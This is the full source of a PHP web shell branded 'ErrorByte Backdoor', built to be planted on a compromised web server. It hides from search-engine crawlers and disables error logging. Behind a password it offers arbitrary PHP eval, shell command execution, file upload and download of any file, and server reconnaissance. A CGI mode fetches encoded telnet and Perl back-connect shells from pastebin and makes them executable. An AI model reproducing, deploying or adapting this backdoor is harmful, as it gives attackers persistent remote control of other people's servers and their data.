<?php
# Config Shell
error_reporting(0);
$password = 'ErrorByte';
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "NONE";
?>
<?php
session_start();
$auth_pass = $password;
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<?php
echo '
<html>
<head>
<title>ErrorByte Backdoor</title>
<link rel="shortcut icon" type="image/x-icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: white;
	text-align: center;
}
header {
	color: aqua;
	margin: 10px auto;
}
input[type=password] {
	color: red;
	background: transparent;
	border: 1px solid white;
}
input[type=submit] {
	color: white;
	background: transparent;
	border: 1px solid white;
}
</style>
</head>
<table height="100%" width="100%">
<td align="center">
<form action="'.$_SERVER['PHP_SELF'].'" enctype="multipart/form-data" method="post">
<font size="5">ErrorByte Backdoor</font>
<br><br><input type="password" name="pass">
<input type="submit" value="Login !!!">
</form>
</td>
</table>';
?>
<?php
exit;
}
if(!isset($_SESSION[$_SERVER['HTTP_HOST']]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && ($_POST['pass'] == $auth_pass) ) )
        $_SESSION[$_SERVER['HTTP_HOST']] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<?php
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
$dir = $_GET['d'];
chdir($dir);
$direktori = getcwd();
if(isset($_GET['eval'])) {
$cok = str_replace("'", '"', $_GET['eval']); echo eval($cok);
echo "<br><br><a href='?'>Back Home</a>";
exit;
}
?>
<title>ErrorByte Backdoor</title>
<link rel="shortcut icon" type="image/x-icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
<style>
html {
background: black;
color: white;
}
.hasilshell {
border: 1px solid white;
height: 200px;
width: 100%;
}
input{
border: 1px solid white;
}
a {
color: red;
text-decoration: none;
}
</style>
<script type="text/javascript">
    function evalp() {
        var evalphp = document.getElementById('evalphp').value;
        window.location = "?eval=" + evalphp;
    }
</script>
<hr>
<center>
<h1>ErrorByte Backdoor</h1>
<hr>
[ <a href="?">Home</a> ] [ <a href="?eval_php">Eval PHP</a> ] [ <a href="?cgi">CGI Telnet</a> ] [ <a href="?info">Info Server</a> ] [ <a href="?change">Change Password</a> ] [ <a href="?out">Logout</a> ]
</center>
<?php
if(isset($_REQUEST['out'])) {
	unset($_SESSION[$_SERVER['HTTP_HOST']]);
	echo "<script>window.location='?';</script>";
} elseif(isset($_REQUEST['info'])) {
echo "<hr>";
echo "Kernel : <font color='red'>".php_uname()."</font><br>
Disable Function : $show_ds";
exit;
} elseif(isset($_REQUEST['eval_php'])) {
echo "<hr>";
echo '<textarea id="evalphp" class="hasilshell"></textarea><br><br>
<input onclick="evalp();" type="submit" value="Go!"/>';
exit;
} elseif(isset($_REQUEST['change'])) {
echo "<hr><form enctypr='multipart/post-data' method='post'>
New Password : <input type='text' name='pass_baru' placeholder='$password'>
<input type='submit' value='Change !'>
</form>";
if(isset($_POST['pass_baru'])){
$self = $_SERVER['SCRIPT_FILENAME'];
$proc = file($self);
$replace = str_replace('$password = '."'".$password."'", '$password = '."'".$_POST['pass_baru']."'", $proc);
$ganti = file_put_contents($self, $replace);
if($ganti) {
echo "Password Save As <font color='red'>".$_POST['pass_baru']."</font>";
} else {
echo 'Failed Change Password !!!';
}
}
exit;
} elseif(isset($_REQUEST['cgi'])) { 
echo '<hr>';
chdir($direktori);
 mkdir('cgi', 0755);
    chdir('cgi');      
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = file_get_contents("https://pastebin.com/raw/0xVVQjZu");
$file = fopen("izo.cin" ,"w+");
$isi = str_replace("123456", $password , base64_decode($cgishellizocin));
$write = fwrite ($file ,$isi);
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = file_get_contents("https://pastebin.com/raw/6dQxUeUh");

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
   echo "<iframe src=cgi/izo.cin width=96% height=90% frameborder=0></iframe> 

 
 </div>";
exit;
}
?>
<hr>
<script type="text/javascript">
    function KeDirektori() {
        var direktori = document.getElementById('direktori').value;
        window.location = "?d=" + direktori;
    }
</script>
Path : <input id="direktori" type="text" value="<?php echo $direktori; ?>"/>
<input onclick="KeDirektori();" type="submit" value="Go!"/>
<hr>
<form enctype="multipart/form-data" method="post">
<input type="file" name="upd">
<input type="submit" value="Upload!">
</form>
<?php
if(isset($_FILES['upd'])) {
if(copy($_FILES['upd']['tmp_name'],$_FILES['upd']['name'])) {
echo $_FILES['upd']['name']." Uploaded !!!";
} else {
echo "Failed Upload ".$_FILES['upd']['name'];
}
}
?>
<hr>
PHP Execution Command : <?php echo (shell_exec('dir')) ? "ON" : "OFF"; ?>
<hr>
<form enctype="multipart/form-data" method="post">
ErrorByte@<?php echo $_SERVER['HTTP_HOST']; ?>:~ $
<input type="text" name="shell">
<input type="submit" value="!">
</form>
<hr>
<textarea class="hasilshell">
<?php
if(isset($_POST['shell'])) {
echo shell_exec($_POST['shell']);
}
?>
</textarea>
<hr>
File And Directory<br>
<hr>
<textarea class="hasilshell">
<?php
if(shell_exec('dir -l')) {
echo shell_exec('dir -l');
} else {
echo "[ Execute Error ]";
}
?>
</textarea>
<hr>
<center>Copyleft &copy;2018 - ErrorByte
<hr>
